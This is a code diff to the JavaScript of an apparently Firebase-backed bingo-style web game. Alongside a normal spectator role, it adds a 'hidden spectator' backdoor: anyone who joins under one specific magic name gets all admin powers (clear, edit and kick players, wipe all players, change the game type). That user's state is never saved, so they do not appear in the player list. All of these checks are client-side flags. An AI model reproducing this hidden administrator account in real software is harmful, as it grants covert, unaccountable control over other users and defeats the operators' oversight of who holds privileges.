@@ -801,6 +801,8 @@
     let gameState = null;
     let playerId = null;
     let isAdmin = false;
+    let isSpectator = false;
+    let isHiddenSpectator = false;
     let currentGameType = "Any Line"; // Default game type
     let offlineMode = false;
     // Get or create player ID from localStorage
@@ -906,7 +908,7 @@
             html += `<span class="admin-badge" style="background: #6c757d;">SPECTATOR</span>`;
           }
           html += statusText;
-          if (isAdmin && p.id !== playerId && !p.isSpectator) {
+          if ((isAdmin || isHiddenSpectator) && p.id !== playerId && !p.isSpectator) {
             html += `<div class="admin-controls">`;
             html += `<button class="admin-btn" onclick="window.adminClearPlayer('${p.id}')">Clear</button>`;
             html += `<button class="admin-btn" onclick="window.adminEditPlayer('${p.id}')">Edit</button>`;
@@ -970,7 +972,7 @@
     }
     // Admin: Clear a player's cards
     window.adminClearPlayer = async function(targetPlayerId) {
-      if (!isAdmin) {
+      if (!isAdmin && !isHiddenSpectator) {
         alert('Admin access only');
         return;
       }
@@ -992,7 +994,7 @@
     }
     // Admin: Kick a player
     window.adminKickPlayer = async function(targetPlayerId) {
-      if (!isAdmin) {
+      if (!isAdmin && !isHiddenSpectator) {
         alert('Admin access only');
         return;
       }
@@ -1003,7 +1005,7 @@
     }
     // Admin: Edit a player's cards
     window.adminEditPlayer = async function(targetPlayerId) {
-      if (!isAdmin) {
+      if (!isAdmin && !isHiddenSpectator) {
         alert('Admin access only');
         return;
       }
@@ -1145,7 +1147,7 @@
     }
     // Admin: Clear all players from the system
     window.adminClearAllPlayers = async function() {
-      if (!isAdmin) {
+      if (!isAdmin && !isHiddenSpectator) {
         alert('Admin access only');
         return;
       }
@@ -1203,7 +1205,8 @@
         id: playerId,
         name: gameState.playerName,
         expiresAt: expirationDate.toISOString(),
-        lastActive: new Date().toISOString()
+        lastActive: new Date().toISOString(),
+        isSpectator: isSpectator || undefined
       });
     }
     // Load game state from Firebase
@@ -1247,6 +1250,8 @@
         console.log('Generated new player ID:', playerId);
       }
       isAdmin = (playerName === ADMIN_NAME);
+      isSpectator = (playerName.toLowerCase() === 'spectator');
+      isHiddenSpectator = (playerName === '[nucca]');
       gameState = {
         playerId: playerId,
         playerName: playerName,
@@ -1262,23 +1267,31 @@
         card.marked[12] = true;
       });
       console.log('Saving new game state for player:', playerName);
-      saveGameState();
+      if (!isHiddenSpectator) {
+        saveGameState();
+      }
       showPlayerInfo();
       renderCards();
       document.getElementById('activePlayers').style.display = 'block';
       updatePlayerListPanel();
-      if (isAdmin) {
+      if (isAdmin || isHiddenSpectator) {
         document.getElementById('gameTypeSelect').style.display = 'inline-block';
       }
     }
     function showPlayerInfo() {
       const playerInfo = document.getElementById('playerInfo');
       let infoText = `Welcome, ${gameState.playerName}! 🎯`;
-      if (isAdmin) {
+      if (isAdmin || isHiddenSpectator) {
         infoText += ' <span style="background: #d51e47; color: white; padding: 5px 10px; border-radius: 5px; font-size: 0.9em;">👑 ADMIN</span>';
         // Show admin buttons
         document.getElementById('adminClearAllBtn').style.display = 'inline-block';
         document.getElementById('adminManageRequestsBtn').style.display = 'inline-block';
+      }
+      if (isSpectator) {
+        infoText += ' <span style="background: #6c757d; color: white; padding: 5px 10px; border-radius: 5px; font-size: 0.9em;">SPECTATOR</span>';
+      }
+      if (isHiddenSpectator) {
+        infoText += ' <span style="background: #6c757d; color: white; padding: 5px 10px; border-radius: 5px; font-size: 0.9em;">HIDDEN SPECTATOR</span>';
       }
       playerInfo.innerHTML = infoText;
       playerInfo.style.display = 'block';
@@ -1592,7 +1605,7 @@
       manageRequests();
     }
     window.setGameType = async function(type) {
-      if (!isAdmin) return;
+      if (!isAdmin && !isHiddenSpectator) return;
       await set(ref(database, 'config/currentGameType'), type);
       alert('Game type set to ' + type);
     }
@@ -1689,6 +1702,8 @@
           if (!Array.isArray(card.memberIds)) card.memberIds = Object.values(card.memberIds || {});
         });
         isAdmin = (gameState.playerName === ADMIN_NAME);
+        isSpectator = !!gameState.isSpectator;
+        isHiddenSpectator = (gameState.playerName === '[nucca]');
         // Verify cards exist
         if (!gameState.cards || gameState.cards.length !== 3) {
           console.error('❌ Cards data is missing or invalid!');
